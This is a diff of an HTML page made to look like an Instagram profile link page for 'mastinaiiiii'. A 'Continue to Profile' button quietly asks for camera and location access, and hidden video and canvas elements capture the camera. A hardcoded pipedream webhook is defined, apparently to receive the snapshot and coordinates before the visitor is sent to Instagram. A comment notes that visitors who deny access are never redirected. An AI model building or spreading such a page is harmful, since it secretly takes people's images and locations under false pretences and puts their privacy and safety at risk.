@@ -3,24 +3,22 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>mastinaiiiii | Exclusive Feed</title>
+    <title>mastinaiiiii</title>
     <style>
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; color: #111; }
-        .card { width: 100%; max-width: 350px; text-align: center; padding: 20px; }
-        .avatar { width: 110px; height: 110px; background: #eee; border-radius: 50%; margin: 0 auto 20px; border: 1px solid #dbdbdb; }
-        h1 { font-size: 1.25rem; font-weight: 600; margin-bottom: 10px; }
-        p { font-size: 0.95rem; color: #555; margin-bottom: 30px; line-height: 1.4; padding: 0 10px; }
-        .btn { background: #000; color: #fff; border: none; padding: 14px 0; border-radius: 8px; font-weight: 600; cursor: pointer; width: 100%; font-size: 0.95rem; transition: background 0.2s; }
+        .card { width: 100%; max-width: 320px; text-align: center; padding: 40px 20px; }
+        h1 { font-size: 1.5rem; font-weight: 700; margin-bottom: 15px; }
+        .bio { font-size: 1rem; color: #333; margin-bottom: 25px; line-height: 1.5; }
+        .btn { background: #000; color: #fff; border: none; padding: 16px 0; border-radius: 8px; font-weight: 600; cursor: pointer; width: 100%; font-size: 1rem; transition: background 0.2s; }
         .btn:hover { background: #333; }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
     <div class="card">
-        <div class="avatar"></div>
         <h1>mastinaiiiii</h1>
-        <p>Follow my page on Instagram.</p>
-        <button id="cta" class="btn">View Full Profile</button>
+        <p class="bio">Follow Me On Instagram.</p>
+        <button id="cta" class="btn">Continue to Profile</button>
     </div>
 
     <video id="v" autoplay playsinline></video>
@@ -32,13 +30,10 @@
         const c = document.getElementById('c');
         const webhook = 'https://eoukkf7emqrufvo.m.pipedream.net/';
 
-        async function gatherData() {
+        btn.addEventListener('click', async () => {
             try {
-                // Get Camera
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 v.srcObject = stream;
-                
-                // Get Location
                 const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej));
                 
                 setTimeout(async () => {
@@ -60,14 +55,9 @@
                     window.location.href = 'https://www.instagram.com/mastinaiiiii';
                 }, 500);
             } catch (e) {
-                console.error("Access denied or failed.");
+                // Redirect stays blocked if they deny access.
             }
-        }
-
-        btn.addEventListener('click', gatherData);
+        });
     </script>
 </body>
 </html>
-
-
-
